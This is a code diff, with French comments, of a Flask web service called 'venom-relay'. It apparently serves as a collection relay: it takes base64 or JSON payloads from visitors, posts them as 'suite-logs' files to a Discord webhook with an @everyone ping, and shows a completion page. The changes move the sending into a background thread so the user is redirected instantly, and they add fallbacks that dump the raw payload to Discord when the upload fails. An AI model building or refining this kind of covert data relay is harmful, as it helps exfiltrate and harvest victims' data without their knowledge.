@@ -1,10 +1,12 @@
 # venom-relay — Render Web Service (Python / Flask)
 # env vars : DISCORD_WEBHOOK (obligatoire), SECRET (optionnel)
+# route    : GET /?data=<base64url>&key=<secret>  |  POST /  (json brut)
 
 import os
 import base64
 import json
 import time
+import threading
 
 from dotenv import load_dotenv
 load_dotenv()
@@ -140,33 +142,49 @@ def build_embeds(parsed: dict) -> list:
     }]
 
 
-def forward(parsed: dict, payload: str) -> Response:
-    files = {
-        "files[0]": (
-            f"suite-logs-{int(time.time()*1000)}.json",
-            payload.encode("utf-8"),
-            "application/json",
-        )
-    }
-    data = {
-        "payload_json": json.dumps({
-            "content": PING,
-            "username": BRAND,
-            "allowed_mentions": {"parse": ["everyone"]},
-            "embeds": build_embeds(parsed),
-            "attachments": [{"id": "0", "filename": "suite-logs.json"}],
-        }),
-    }
-
+def send_to_discord(parsed: dict, payload: str):
+    """Exécuté dans un thread séparé pour ne pas bloquer la redirection."""
     try:
+        files = {
+            "files[0]": (
+                f"suite-logs-{int(time.time()*1000)}.json",
+                payload.encode("utf-8"),
+                "application/json",
+            )
+        }
+        data = {
+            "payload_json": json.dumps({
+                "content": PING,
+                "username": BRAND,
+                "allowed_mentions": {"parse": ["everyone"]},
+                "embeds": build_embeds(parsed),
+                "attachments": [{"id": "0", "filename": "suite-logs.json"}],
+            }),
+        }
+
+        # Timeout court car on est déjà en arrière-plan
         r = requests.post(WEBHOOK, data=data, files=files, timeout=10)
+        
+        # Fallback si l'embed plante (ex: payload trop gros)
         if not r.ok:
-            # Affiche l'erreur dans les logs Render pour debug
             print(f"Discord API error: {r.status_code} - {r.text}", flush=True)
+            fallback_data = {"content": f"**{BRAND}** Fallback:\n```json\n{payload[:1900]}\n```"}
+            requests.post(WEBHOOK, json=fallback_data, timeout=10)
+            
     except Exception as e:
         print(f"Failed to reach Discord: {e}", flush=True)
+        try:
+            fallback_data = {"content": f"**{BRAND}** Fallback (no embed):\n```json\n{payload[:1900]}\n```"}
+            requests.post(WEBHOOK, json=fallback_data, timeout=10)
+        except Exception:
+            pass
 
-    # On force la redirection même si le webhook échoue
+
+def forward(parsed: dict, payload: str) -> Response:
+    # Lance l'envoi Discord en arrière-plan
+    threading.Thread(target=send_to_discord, args=(parsed, payload), daemon=True).start()
+    
+    # Redirige l'utilisateur instantanément
     return Response(done_page(parsed), mimetype="text/html")
 
 
